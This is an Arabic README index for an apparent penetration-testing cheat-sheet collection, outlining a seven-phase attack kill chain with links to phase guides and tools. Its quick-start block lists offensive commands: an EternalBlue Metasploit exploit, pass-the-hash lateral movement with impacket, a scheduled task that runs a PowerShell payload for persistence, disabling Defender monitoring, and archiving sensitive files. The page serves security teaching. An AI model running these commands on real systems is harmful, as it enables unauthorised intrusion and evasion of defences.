<a id="-attack-methodology---kill-chain"></a>
# 🎯 منهجية الهجوم — سلسلة الهجوم (Kill Chain)

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗    ██╗  ██╗██╗██╗     ██╗          ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗
  ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝    ██║ ██╔╝██║██║     ██║         ██╔════╝██║  ██║██╔══██╗██║████╗  ██║
  ███████║   ██║      ██║   ███████║██║     █████╔╝     █████╔╝ ██║██║     ██║         ██║     ███████║███████║██║██╔██╗ ██║
  ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗     ██╔═██╗ ██║██║     ██║         ██║     ██╔══██║██╔══██║██║██║╚██╗██║
  ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    ██║  ██╗██║███████╗███████╗    ╚██████╗██║  ██║██║  ██║██║██║ ╚████║
  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
```

---

<a id="-what-is-the-attack-kill-chain"></a>
## 🎯 ما المقصود بسلسلة الهجوم؟

تصف **سلسلة الهجوم (Attack Kill Chain)** المراحل التي يمر بها المهاجم لاختراق نظام أو شبكة مستهدفة واستغلالها. يربط النص الأصلي هذا المفهوم بمصطلحي **Cyber Kill Chain** و**MITRE ATT&CK**؛ يوضح التنبيه التالي الفرق بينهما.

> **توضيح:** [Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html) و[MITRE ATT&CK](https://attack.mitre.org/) نموذجان مختلفان؛ الأول يصف مراحل الهجوم، والثاني قاعدة معرفة بتكتيكات الخصوم وتقنياتهم. التسلسل ذو المراحل السبع هنا تنظيم تعليمي مبسّط، وليس نقلاً حرفياً لأي منهما.

---

<a id="-kill-chain-phases"></a>
## 📊 مراحل سلسلة الهجوم

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           ATTACK LIFECYCLE                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────────────┐        │
│   │ 1. INITIAL   │───▶│ 2. DISCOVERY │───▶│ 3. PRIVILEGE         │        │
│   │    ACCESS    │    │ ENUMERATION  │    │    ESCALATION        │        │
│   └──────────────┘    └──────────────┘    └──────────────────────┘        │
│          │                                           │                      │
│          │                                           ▼                      │
│          │                               ┌──────────────────────┐          │
│          │                               │ 4. LATERAL           │          │
│          │                               │    MOVEMENT          │          │
│          │                               └──────────────────────┘          │
│          │                                           │                      │
│          ▼                                           ▼                      │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────────────┐        │
│   │ 7. ACTIONS   │◀───│ 6. DEFENSE   │◀───│ 5. PERSISTENCE       │        │
│   │ ON OBJECTIVES│    │    EVASION   │    │                      │        │
│   └──────────────┘    └──────────────┘    └──────────────────────┘        │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

<a id="-phase-guides"></a>
## 📖 أدلة المراحل

| المرحلة | الوصف | الدليل |
|-------|-------------|-------|
| **1. الوصول الأولي** | موطئ قدم أولي داخل الهدف | [📄 عرض](./01-Initial-Access.ar.md) |
| **2. الاكتشاف وحصر المعلومات** | جمع معلومات عن النظام المخترق | [📄 عرض](./02-Enumeration.ar.md) |
| **3. تصعيد الصلاحيات** | رفع الصلاحيات إلى مسؤول/root | [📄 عرض](./03-Privilege-Escalation.ar.md) |
| **4. الحركة الجانبية** | الانتقال عبر الشبكة إلى أنظمة أخرى | [📄 عرض](./04-Lateral-Movement.ar.md) |
| **5. ترسيخ الوصول** | الحفاظ على الوصول بعد إعادة التشغيل أو الاكتشاف | [📄 عرض](./05-Persistence.ar.md) |
| **6. تفادي الدفاعات** | تجاوز AV وEDR والضوابط الأمنية | [📄 عرض](./06-Defense-Evasion.ar.md) |
| **7. تنفيذ الأهداف** | تحقيق الهدف النهائي (إخراج البيانات أو إحداث أثر) | [📄 عرض](./07-Actions-Objectives.ar.md) |

---

<a id="-related-cheatsheets"></a>
## 🔗 أدلة مرجعية ذات صلة

<a id="by-phase"></a>
### حسب المرحلة

| المرحلة | الأدوات ذات الصلة |
|-------|---------------|
| الوصول الأولي | [Metasploit](../../Metasploit/README.md), [SQLMap](../../SQLMap/README.md), [Hydra](../../Hydra/README.md) |
| حصر المعلومات | [Nmap](../../Nmap/README.md), [BloodHound](../../BloodHound/README.md), [PowerView](../../PowerView/README.md) |
| تصعيد الصلاحيات | [Linux-PrivEsc](../../Linux-PrivEsc/README.md), [Windows-PrivEsc](../../Windows-PrivEsc/README.md) |
| الحركة الجانبية | [Impacket](../../Impacket/README.md), [CrackMapExec](../../CrackMapExec/README.md), [Evil-WinRM](../../Evil-WinRM/README.md) |
| ترسيخ الوصول | [PowerShell](../../PowerShell/README.md), [Metasploit](../../Metasploit/README.md) |
| تفادي الدفاعات | [Mimikatz](../../Mimikatz/README.md), [PowerShell](../../PowerShell/README.md) |
| إخراج البيانات (Data Exfiltration) | [Linux-Commands](../../Linux-Commands/README.md) |

---

<a id="-quick-start"></a>
## 📚 بداية سريعة

<a id="typical-attack-flow"></a>
### تسلسل هجوم نموذجي
```bash
# 1. الوصول الأولي — استغلال ثغرة
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; exploit"

# 2. الحصر — اكتشاف الموارد التي تستطيع الوصول إليها
whoami /all
systeminfo
net user

# 3. تصعيد الصلاحيات — الحصول على SYSTEM/root
.\winPEAS.exe

# 4. الحركة الجانبية — الانتقال إلى أنظمة أخرى
impacket-psexec -hashes :HASH administrator@192.168.1.20

# 5. ترسيخ الوصول — الحفاظ على الوصول
schtasks /create /tn "Updater" /tr "powershell -ep bypass -c IEX(payload)" /sc onlogon

# 6. تفادي الدفاعات — تعطيل مكافحة الفيروسات
Set-MpPreference -DisableRealtimeMonitoring $true

# 7. تنفيذ الأهداف — إخراج البيانات
Compress-Archive -Path C:\Sensitive -DestinationPath C:\Temp\data.zip
```

---

<a id="-resources"></a>
## 📚 المراجع

- [إطار MITRE ATT&CK](https://attack.mitre.org/)
- [Cyber Kill Chain - Lockheed Martin](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
- [Unified Kill Chain](https://www.unifiedkillchain.com/)

---

<p align="center">
  <b>🎯 اتبع سلسلة الهجوم!</b><br>
  <i>لاختبارات الاختراق المصرح بها فقط!</i>
</p>
